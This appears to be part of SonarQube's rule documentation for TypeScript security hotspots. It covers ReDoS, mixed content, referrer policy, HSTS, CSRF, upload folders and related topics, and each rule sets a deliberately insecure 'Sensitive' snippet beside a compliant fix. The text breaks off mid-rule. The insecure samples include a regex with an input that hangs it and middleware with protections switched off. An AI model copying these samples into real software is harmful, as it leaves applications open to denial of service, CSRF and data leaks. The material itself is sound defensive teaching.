<ul>
  <li> If applicable, define a maximum number of expected repetitions using the bounded quantifiers, like <code>{1,5}</code> instead of <code>+</code>
  for instance. </li>
  <li> Refactor nested quantifiers to limit the number of way the inner group can be matched by the outer quantifier, for instance this nested
  quantifier situation <code>(ba+)+</code> doesn’t cause performance issues, indeed, the inner group can be matched only if there exists exactly one
  <code>b</code> char per repetition of the group. </li>
  <li> Optimize regular expressions by emulating <em>possessive quantifiers</em> and <em>atomic grouping</em>. </li>
  <li> Use negated character classes instead of <code>.</code> to exclude separators where applicable. For example the quadratic regex
  <code>.*_.*</code> can be made linear by changing it to <code>[^_]*_.*</code> </li>
</ul>
<p>Sometimes it’s not possible to rewrite the regex to be linear while still matching what you want it to match. Especially when the regex is not
anchored to the beginning of the string, for which it is quite hard to avoid quadratic runtimes. In those cases consider the following approaches:</p>
<ul>
  <li> Solve the problem without regular expressions </li>
  <li> Use an alternative non-backtracking regex implementations such as Google’s <a href="https://github.com/google/re2">RE2</a> or <a
  href="https://github.com/uhop/node-re2/">node-re2</a>. </li>
  <li> Use multiple passes. This could mean pre- and/or post-processing the string manually before/after applying the regular expression to it or
  using multiple regular expressions. One example of this would be to replace <code>str.split(/\s*,\s*/)</code> with <code>str.split(",")</code> and
  then trimming the spaces from the strings as a second step. </li>
  <li> It is often possible to make the regex infallible by making all the parts that could fail optional, which will prevent backtracking. Of course
  this means that you’ll accept more strings than intended, but this can be handled by using capturing groups to check whether the optional parts were
  matched or not and then ignoring the match if they weren’t. For example the regex <code>x*y</code> could be replaced with <code>x*(y)?</code> and
  then the call to <code>str.match(regex)</code> could be replaced with <code>matched = str.match(regex)</code> and <code>matched[1] !==
  undefined</code>. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>The regex evaluation will never end:</p>
<pre>
/(a+)+$/.test(
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaa!"
); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>Possessive quantifiers do not keep backtracking positions, thus can be used, if possible, to avoid performance issues. Unfortunately, they are not
supported in JavaScript, but one can still mimick them using lookahead assertions and backreferences:</p>
<pre>
/((?=(a+))\2)+$/.test(
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"+
"aaaaaaaaaaaaaaa!"
); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A1_2017-Injection">Top 10 2017 Category A1 - Injection</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/1333">CWE-1333 - Inefficient Regular Expression Complexity</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/Regular_expression_Denial_of_Service_-_ReDoS">owasp.org</a> - OWASP Regular expression Denial
  of Service - ReDoS </li>
  <li> <a
  href="https://web.archive.org/web/20220506215733/https://stackstatus.net/post/147710624694/outage-postmortem-july-20-2016">stackstatus.net(archived)</a> - Outage Postmortem - July 20, 2016 </li>
  <li> <a href="https://www.regular-expressions.info/catastrophic.html">regular-expressions.info</a> - Runaway Regular Expressions: Catastrophic
  Backtracking </li>
  <li> <a
  href="https://docs.microsoft.com/en-us/dotnet/standard/base-types/backtracking-in-regular-expressions#backtracking-with-nested-optional-quantifiers">docs.microsoft.com</a> - Backtracking with Nested Optional Quantifiers </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5730">
              typescript:S5730
            </a>
          </td>
          <td>
            <details>
              <p>A mixed-content is when a resource is loaded with the HTTP protocol, from a website accessed with the HTTPs protocol, thus mixed-content are not
encrypted and exposed to <a href="https://en.wikipedia.org/wiki/Man-in-the-middle_attack">MITM attacks</a> and could break the entire level of
protection that was desired by implementing encryption with the HTTPs protocol.</p>
<p>The main threat with mixed-content is not only the confidentiality of resources but the whole website integrity:</p>
<ul>
  <li> A passive mixed-content (eg: <em>&lt;img src="http://example.com/picture.png"&gt;</em>) allows an attacker to access and replace only these
  resources, like images, with malicious ones that could lead to successful phishing attacks. </li>
  <li> With active mixed-content (eg: <em>&lt;script src="http://example.com/library.js"&gt;</em>) an attacker can compromise the entire website by
  injecting malicious javascript code for example (accessing and modifying the DOM, steal cookies, etc). </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The HTTPS protocol is in place and external resources are fetched from the website pages. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement content security policy <em>block-all-mixed-content</em> directive which is supported by all modern browsers and will block loading of
mixed-contents.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet-csp">helmet-csp</a> or <a
href="https://www.npmjs.com/package/helmet">helmet</a> middleware is used without the <code>blockAllMixedContent</code> directive:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      "default-src": ["'self'", 'example.com', 'code.jquery.com']
    } // Sensitive: blockAllMixedContent directive is missing
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to block mixed-content is to put in place the <a
href="https://www.npmjs.com/package/helmet-csp">helmet-csp</a> or <a href="https://www.npmjs.com/package/helmet">helmet</a> middleware with the
<code>blockAllMixedContent</code> directive:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.contentSecurityPolicy({
    directives: {
      "default-src": ["'self'", 'example.com', 'code.jquery.com'],
      blockAllMixedContent: [] // Compliant
    }
  })
);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Mixed_content">developer.mozilla.org</a> - Mixed-content </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">developer.mozilla.org</a> - Content Security Policy (CSP) </li>
  <li> <a href="https://www.w3.org/TR/CSP3/">w3.org</a> - Content Security Policy Level 3 </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5736">
              typescript:S5736
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://en.wikipedia.org/wiki/HTTP_referer">HTTP header referer</a> contains a URL set by web browsers and used by applications to track
from where the user came from, it’s for instance a relevant value for web analytic services, but it can cause <a
href="https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns">serious privacy and security problems</a>
if the URL contains confidential information. Note that Firefox for instance, to prevent data leaks, <a
href="https://blog.mozilla.org/security/2018/01/31/preventing-data-leaks-by-stripping-path-information-in-http-referrers/">removes path
information</a> in the Referer header while browsing privately.</p>
<p>Suppose an e-commerce website asks the user his credit card number to purchase a product:</p>
<pre>
&lt;html&gt;
&lt;body&gt;
&lt;form action="/valid_order" method="GET"&gt;
Type your credit card number to purchase products:
&lt;input type=text id="cc" value="1111-2222-3333-4444"&gt;
&lt;input type=submit&gt;
&lt;/form&gt;
&lt;/body&gt;
</pre>
<p>When submitting the above HTML form, a HTTP GET request will be performed, the URL requested will be
https://example.com/valid_order?cc=1111-2222-3333-4444 with credit card number inside and it’s obviously not secure for these reasons:</p>
<ul>
  <li> URLs are stored in the history of browsers. </li>
  <li> URLs could be accidentally shared when doing copy/paste actions. </li>
  <li> URLs can be stolen if a malicious person looks at the computer screen of an user. </li>
</ul>
<p>In addition to these threats, when further requests will be performed from the "valid_order" page with a simple legitimate embedded script like
that:</p>
<pre>
&lt;script src="https://webanalyticservices_example.com/track"&gt;
</pre>
<p>The referer header which contains confidential information will be send to a third party web analytic service and cause privacy issue:</p>
<pre>
GET /track HTTP/2.0
Host: webanalyticservices_example.com
Referer: https://example.com/valid_order?cc=1111-2222-3333-4444
</pre>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Confidential information exists in URLs. </li>
  <li> Semantic of HTTP methods is not respected (eg: use of a GET method instead of POST when the state of the application is changed). </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Confidential information should not be set inside URLs (GET requests) of the application and a safe (ie: different from <code>unsafe-url</code> or
<code>no-referrer-when-downgrade</code>) <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">referrer-Policy</a>
header, to control how much information is included in the referer header, should be used.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet">helmet</a> <code>referrerPolicy</code>
middleware is disabled or used with <code>no-referrer-when-downgrade</code> or <code>unsafe-url</code>:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

app.use(
  helmet.referrerPolicy({
    policy: 'no-referrer-when-downgrade' // Sensitive: no-referrer-when-downgrade is used
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a secure solution is to user the <a href="https://www.npmjs.com/package/helmet">helmet</a> referrer policy middleware set
to <code>no-referrer</code>:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.referrerPolicy({
    policy: 'no-referrer' // Compliant
  })
);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Referrer-Policy">developer.mozilla.org</a> - Referrer-Policy </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Referer_header:_privacy_and_security_concerns">developer.mozilla.org</a> -
  Referer header: privacy and security concerns </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5739">
              typescript:S5739
            </a>
          </td>
          <td>
            <details>
              <p>When implementing the HTTPS protocol, the website mostly continue to support the HTTP protocol to redirect users to HTTPS when they request a HTTP
version of the website. These redirects are not encrypted and are therefore vulnerable to man in the middle attacks. The <a
href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security">Strict-Transport-Security policy header</a> (HSTS) set by
an application instructs the web browser to convert any HTTP request to HTTPS.</p>
<p>Web browsers that see the Strict-Transport-Security policy header for the first time record information specified in the header:</p>
<ul>
  <li> the <code>max-age</code> directive which specify how long the policy should be kept on the web browser. </li>
  <li> the <code>includeSubDomains</code> optional directive which specify if the policy should apply on all sub-domains or not. </li>
  <li> the <code>preload</code> optional directive which is not part of the HSTS specification but supported on all modern web browsers. </li>
</ul>
<p>With the <code>preload</code> directive the web browser never connects in HTTP to the website and to use this directive, it is required <a
href="https://hstspreload.org/">to submit</a> the concerned application to a preload service maintained by Google.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The website is accessible with the unencrypted HTTP protocol. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement Strict-Transport-Security policy header, it is recommended to apply this policy to all subdomains (<code>includeSubDomains</code>) and
for at least 6 months (<code>max-age=15552000</code>) or even better for 1 year (<code>max-age=31536000</code>).</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/helmet">helmet</a> or <a
href="https://www.npmjs.com/package/hsts">hsts</a> middleware are disabled or used without recommended values:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(helmet.hsts({
  maxAge: 3153600, // Sensitive, recommended &gt;= 15552000
  includeSubDomains: false // Sensitive, recommended 'true'
}));
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application a standard way to implement HSTS is with the <a href="https://www.npmjs.com/package/helmet">helmet</a> or <a
href="https://www.npmjs.com/package/hsts">hsts</a> middleware:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(helmet.hsts({
  maxAge: 31536000,
  includeSubDomains: true
})); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Strict-Transport-Security">developer.mozilla.org</a> - Strict Transport
  Security </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5743">
              typescript:S5743
            </a>
          </td>
          <td>
            <details>
              <p>This rule is deprecated, and will eventually be removed.</p>
<p>By default, web browsers perform <a href="https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch/">DNS prefetching</a> to reduce
latency due to DNS resolutions required when an user clicks links from a website page.</p>
<p>For instance on example.com the hyperlink below contains a cross-origin domain name that must be resolved to an IP address by the web browser:</p>
<pre>
&lt;a href="https://otherexample.com"&gt;go on our partner website&lt;/a&gt;
</pre>
<p>It can add significant latency during requests, especially if the page contains many links to cross-origin domains. DNS prefetch allows web
browsers to perform DNS resolving in the background before the user clicks a link. This feature can cause privacy issues because DNS resolving from
the user’s computer is performed without his consent if he doesn’t intent to go to the linked website.</p>
<p>On a complex private webpage, a combination "of unique links/DNS resolutions" can indicate, to a eavesdropper for instance, that the user is
visiting the private page.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Links to cross-origin domains could result in leakage of confidential information about the user’s navigation/behavior of the website. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control">X-DNS-Prefetch-Control</a> header with an
<em>off</em> value but this could significantly degrade website performances.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/dns-prefetch-control">dns-prefetch-control</a>
middleware is disabled or used without the recommended value:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.dnsPrefetchControl({
    allow: true // Sensitive: allowing DNS prefetching is security-sensitive
  })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application the <a href="https://www.npmjs.com/package/dns-prefetch-control">dns-prefetch-control</a> or <a
href="https://www.npmjs.com/package/helmet">helmet</a> middleware is the standard way to implement <code>X-DNS-Prefetch-Control</code> header:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
  helmet.dnsPrefetchControl({
    allow: false // Compliant
  })
);
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-DNS-Prefetch-Control">developer.mozilla.org</a> - X-DNS-Prefetch-Control
  </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Performance/dns-prefetch">developer.mozilla.org</a> - Using dns-prefetch </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S2598">
              typescript:S2598
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>If the file upload feature is implemented without proper folder restriction, it will result in an implicit trust violation within the server, as
trusted files will be implicitly stored alongside third-party files that should be considered untrusted.</p>
<p>This can allow an attacker to disrupt the security of an internal server process or the running application.</p>
<h3>What is the potential impact?</h3>
<p>After discovering this vulnerability, attackers may attempt to upload as many different file types as possible, such as javascript files, bash
scripts, malware, or malicious configuration files targeting potential processes.</p>
<p>Below are some real-world scenarios that illustrate the potential impact of an attacker exploiting the vulnerability.</p>
<h4>Full application compromise</h4>
<p>In the worst-case scenario, the attackers succeed in uploading a file recognized by in an internal tool, triggering code execution.</p>
<p>Depending on the attacker, code execution can be used with different intentions:</p>
<ul>
  <li> Download the internal server’s data, most likely to sell it. </li>
  <li> Modify data, install malware, for instance, malware that mines cryptocurrencies. </li>
  <li> Stop services or exhaust resources, for instance, with fork bombs. </li>
</ul>
<h4>Server Resource Exhaustion</h4>
<p>By repeatedly uploading large files, an attacker can consume excessive server resources, resulting in a denial of service.</p>
<p>If the component affected by this vulnerability is not a bottleneck that acts as a single point of failure (SPOF) within the application, the
denial of service can only affect the attacker who caused it.</p>
<p>Even though a denial of service might have little direct impact, it can have secondary impact in architectures that use containers and container
orchestrators. For example, it can cause unexpected container failures or overuse of resources.</p>
<p>In some cases, it is also possible to force the product to "fail open" when resources are exhausted, which means that some security features are
disabled in an emergency.</p>
<p>These threats are particularly insidious if the attacked organization does not maintain a disaster recovery plan (DRP).</p>
<h2>How to fix it in Formidable</h2>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
const Formidable = require('formidable');

const form          = new Formidable(); // Noncompliant
form.uploadDir      = "/tmp/";
form.keepExtensions = true;
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
const Formidable = require('formidable');

const form          = new Formidable();
form.uploadDir      = "/uploads/";
form.keepExtensions = false;
</pre>
<h3>How does this work?</h3>
<h4>Use pre-approved folders</h4>
<p>Create a special folder where untrusted data should be stored. This folder should be classified as untrusted and have the following
characteristics:</p>
<ul>
  <li> It should have specific read and write permissions that belong to the right people or organizations. </li>
  <li> It should have a size limit or its size should be monitored. </li>
  <li> It should contain backup copies if it contains data that belongs to users. </li>
</ul>
<p>This folder should not be located in <code>/tmp</code>, <code>/var/tmp</code> or in the Windows directory <code>%TEMP%</code>.<br> These folders
are usually "world-writable", can be manipulated, and can be accidentally deleted by the system.</p>
<p>Also, the original file names and extensions should be changed to controlled strings to prevent unwanted code from being executed based on the file
names.</p>
<h2>Resources</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A04_2021-Insecure_Design/">Top 10 2021 Category A4 - Insecure Design</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/434">CWE-434 - Unrestricted Upload of File with Dangerous Type</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/400">CWE-400 - Uncontrolled Resource Consumption</a> </li>
  <li> <a href="https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload">OWASP Unrestricted File Upload</a> - Unrestricted File
  Upload </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5742">
              typescript:S5742
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency">Certificate Transparency</a> (CT) is an open-framework to
protect against identity theft when certificates are issued. <a href="https://en.wikipedia.org/wiki/Certificate_authority">Certificate Authorities</a>
(CA) electronically sign certificate after verifying the identify of the certificate owner. Attackers use, among other things, social engineering
attacks to trick a CA to correctly verifying a spoofed identity/forged certificate.</p>
<p>CAs implement Certificate Transparency framework to publicly log the records of newly issued certificates, allowing the public and in particular
the identity owner to monitor these logs to verify that his identify was not usurped.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The website identity is valuable and well-known, therefore prone to theft. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Implement <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Expect-CT">Expect-CT</a> HTTP header which instructs the web browser
to check <a href="https://www.certificate-transparency.org/known-logs">public CT logs</a> in order to verify if the website appears inside and if it
is not, the browser will block the request and display a warning to the user.</p>
<h2>Sensitive Code Example</h2>
<p>In Express.js application the code is sensitive if the <a href="https://www.npmjs.com/package/expect-ct">expect-ct</a> middleware is disabled:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(
    helmet({
      expectCt: false // Sensitive
    })
);
</pre>
<h2>Compliant Solution</h2>
<p>In Express.js application the <a href="https://www.npmjs.com/package/expect-ct">expect-ct</a> middleware is the standard way to implement
expect-ct. Usually, the deployment of this policy starts with the report only mode (<code>enforce: false</code>) and with a low <code>maxAge</code>
(the number of seconds the policy will apply) value and next if everything works well it is recommended to block future connections that violate
Expect-CT policy (<code>enforce: true</code>) and greater value for maxAge directive:</p>
<pre>
const express = require('express');
const helmet = require('helmet');

let app = express();

app.use(helmet.expectCt({
  enforce: true,
  maxAge: 86400
})); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Certificate_Transparency">developer.mozilla.org</a> - Certificate Transparency
  </li>
  <li> <a href="https://en.wikipedia.org/wiki/Certificate_authority">wikipedia.org</a> - Certificate Authority </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4502">
              typescript:S4502
            </a>
          </td>
          <td>
            <details>
              <p>A cross-site request forgery (CSRF) attack occurs when a trusted user of a web application can be forced, by an attacker, to perform sensitive
actions that he didn’t intend, such as updating his profile or sending a message, more generally anything that can change the state of the
application.</p>
<p>The attacker can trick the user/victim to click on a link, corresponding to the privileged action, or to visit a malicious web site that embeds a
hidden web request and as web browsers automatically include cookies, the actions can be authenticated and sensitive.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The web application uses cookies to authenticate users. </li>
  <li> There exist sensitive operations in the web application that can be performed when the user is authenticated. </li>
  <li> The state / resources of the web application can be modified by doing HTTP POST or HTTP DELETE requests for example. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> Protection against CSRF attacks is strongly recommended:
    <ul>
      <li> to be activated by default for all <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">unsafe HTTP
      methods</a>. </li>
      <li> implemented, for example, with an unguessable CSRF token </li>
    </ul>  </li>
  <li> Of course all sensitive operations should not be performed with <a
  href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol#Safe_methods">safe HTTP</a> methods like <code>GET</code> which are designed to be
  used only for information retrieval. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/csurf">Express.js CSURF middleware</a> protection is not found on an unsafe HTTP method like POST
method:</p>
<pre>
let csrf = require('csurf');
let express = require('express');

let csrfProtection = csrf({ cookie: true });

let app = express();

// Sensitive: this operation doesn't look like protected by CSURF middleware (csrfProtection is not used)
app.post('/money_transfer', parseForm, function (req, res) {
  res.send('Money transferred');
});
</pre>
<p>Protection provided by <a href="https://www.npmjs.com/package/csurf">Express.js CSURF middleware</a> is globally disabled on unsafe methods:</p>
<pre>
let csrf = require('csurf');
let express = require('express');

app.use(csrf({ cookie: true, ignoreMethods: ["POST", "GET"] })); // Sensitive as POST is unsafe method
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/csurf">Express.js CSURF middleware</a> protection is used on unsafe methods:</p>
<pre>
let csrf = require('csurf');
let express = require('express');

let csrfProtection = csrf({ cookie:  true });

let app = express();

app.post('/money_transfer', parseForm, csrfProtection, function (req, res) { // Compliant
  res.send('Money transferred')
});
</pre>
<p>Protection provided by <a href="https://www.npmjs.com/package/csurf">Express.js CSURF middleware</a> is enabled on unsafe methods:</p>
<pre>
let csrf = require('csurf');
let express = require('express');

app.use(csrf({ cookie: true, ignoreMethods: ["GET"] })); // Compliant
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">Top 10 2021 Category A1 - Broken Access Control</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/352">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">Top 10 2017 Category A6 - Security
  Misconfiguration</a> </li>
  <li> <a href="https://owasp.org/www-community/attacks/csrf">OWASP: Cross-Site Request Forgery</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S4507">
              typescript:S4507
            </a>
          </td>
          <td>
            <details>
              <p>Development tools and frameworks usually have options to make debugging easier for developers. Although these features are useful during
development, they should never be enabled for applications deployed in production. Debug instructions or error messages can leak detailed information
about the system, like the application’s path or file names.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The code or configuration enabling the application debug features is deployed on production servers or distributed to end users. </li>
  <li> The application runs by default with debug features activated. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Do not enable debugging features on production servers or applications distributed to end users.</p>
<h2>Sensitive Code Example</h2>
<p><a href="https://www.npmjs.com/package/errorhandler">errorhandler Express.js middleware</a> should not be used in production:</p>
<pre>
const express = require('express');
const errorhandler = require('errorhandler');

let app = express();
app.use(errorhandler()); // Sensitive
</pre>
<h2>Compliant Solution</h2>
<p><a href="https://www.npmjs.com/package/errorhandler">errorhandler Express.js middleware</a> used only in development mode:</p>
<pre>
const express = require('express');
const errorhandler = require('errorhandler');

let app = express();

if (process.env.NODE_ENV === 'development') {
  app.use(errorhandler());
}
</pre>
<h2>See</h2>
<ul>
  <li> OWASP - <a href="https://owasp.org/Top10/A05_2021-Security_Misconfiguration/">Top 10 2021 Category A5 - Security Misconfiguration</a> </li>
  <li> OWASP - <a href="https://owasp.org/www-project-top-ten/2017/A3_2017-Sensitive_Data_Exposure">Top 10 2017 Category A3 - Sensitive Data
  Exposure</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/489">CWE-489 - Active Debug Code</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/215">CWE-215 - Information Exposure Through Debug Information</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=typescript:S5604">
              typescript:S5604
            </a>
          </td>
          <td>
            <details>
              <p><a href="https://www.w3.org/TR/permissions/#powerful-feature">Powerful features</a> are browser features (geolocation, camera, microphone …​) that
can be accessed with JavaScript API and may require a permission granted by the user. These features can have a high impact on privacy and user
security thus they should only be used if they are really necessary to implement the critical parts of an application.</p>
<p>This rule highlights intrusive permissions when requested with <a href="https://developer.mozilla.org/en-US/docs/Web/API/Permissions/query">the
future standard (but currently experimental) web browser query API</a> and specific APIs related to the permission. It is highly recommended to
customize this rule with the permissions considered as intrusive in the context of the web application.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> Some powerful features used by the application are not really necessary. </li>
  <li> Users are not clearly informed why and when powerful features are used by the application. </li>
</ul>
<p>You are at risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<ul>
  <li> In order to respect user privacy it is recommended to avoid using intrusive powerful features. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>When using <a href="https://developer.mozilla.org/en-US/docs/Web/API/Geolocation_API">geolocation API</a>, Firefox for example retrieves personal
information like nearby wireless access points and IP address and sends it to the default geolocation service provider, <a
href="https://www.google.com/privacy/lsf.html">Google Location Services</a>:</p>
<pre>
navigator.permissions.query({name:"geolocation"}).then(function(result) {
});  // Sensitive: geolocation is a powerful feature with high privacy concerns

navigator.geolocation.getCurrentPosition(function(position) {
  console.log("coordinates x="+position.coords.latitude+" and y="+position.coords.longitude);
}); // Sensitive: geolocation is a powerful feature with high privacy concerns
</pre>
<h2>Compliant Solution</h2>
<p>If geolocation is required, always explain to the user why the application needs it and prefer requesting an approximate location when
possible:</p>
<pre>
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;
        Retailer website example
    &lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    Type a city, street or zip code where you want to retrieve the closest retail locations of our products:
    &lt;form method=post&gt;
        &lt;input type=text value="New York"&gt; &lt;!-- Compliant --&gt;
    &lt;/form&gt;
